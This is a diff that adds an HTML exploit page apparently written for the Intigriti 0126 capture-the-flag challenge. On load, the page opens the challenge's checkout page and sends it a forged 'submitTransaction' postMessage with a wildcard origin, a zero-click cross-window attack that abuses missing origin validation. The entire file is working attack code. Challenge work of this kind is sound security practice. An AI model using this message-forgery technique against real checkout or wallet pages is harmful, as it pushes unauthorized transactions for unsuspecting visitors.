@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title>Exploit - Intigriti 0126</title>
+</head>
+<body style="background-color: #050A0E; color: #00FF88; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>CRYPTIGRITI SECURITY AUDIT</h1>
+    <p style="color: #00FF88; margin-top: 20px;">Initializing secure transaction verification...</p>
+    <div id="status" style="margin-top: 20px; font-size: 14px; color: #00AA66;"></div>
+    
+    <script type="text/javascript">
+    //<![CDATA[
+        // Zero-click exploit - executes immediately on page load
+        (function() {
+            var statusEl = document.getElementById('status');
+            statusEl.textContent = 'Opening checkout window...';
+            
+            // 1. Open the vulnerable checkout page
+            var checkoutWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1000000', 'checkout');
+            
+            // 2. Wait for the window to load
+            setTimeout(function() {
+                statusEl.textContent = 'Sending transaction payload...';
+                
+                var payload = {
+                    type: 'submitTransaction',
+                    transaction: {
+                        toAddress: `192d337b06a020958f4dd75c6888d51410`,
+                        currency: '1337COIN',
+                        amount: 1337
+                    }
+                };
+                
+                // 3. Send the malicious message
+                checkoutWindow.postMessage(payload, '*');
+                
+                setTimeout(function() {
+                    statusEl.textContent = 'Exploit completed - check the popup window';
+                }, 500);
+            }, 2500);
+        })();
+    //]]>
+    </script>
+</body>
+</html>
